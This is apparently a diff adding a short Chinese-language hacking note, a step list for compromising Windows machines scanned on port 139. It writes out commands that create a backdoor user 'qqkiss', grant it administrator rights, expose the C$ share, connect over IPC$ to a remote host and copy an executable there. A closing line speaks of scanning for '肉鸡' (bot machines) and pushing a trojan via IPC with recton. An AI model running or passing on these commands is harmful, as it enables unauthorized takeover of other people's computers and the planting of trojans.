@@ -1,0 +1,18 @@
+阿D 扫139
+
+开启 TELNET 以后
+
+net user qqkiss pass /add
+
+net localgroup administrators qqkiss /add
+
+net share c$=c:\
+
+net use k: \\192.168.2.99\c$
+
+net use \\192.168.2.99\ipc$ "qqkiss" /user:"qqkiss"
+
+copy c:\qqkiss.exe \\192.168.2.99\c$\qqkiss.exe
+
+阿D扫肉鸡 recton 2.5 IPC传马启动 阿D启动经常不上线
+
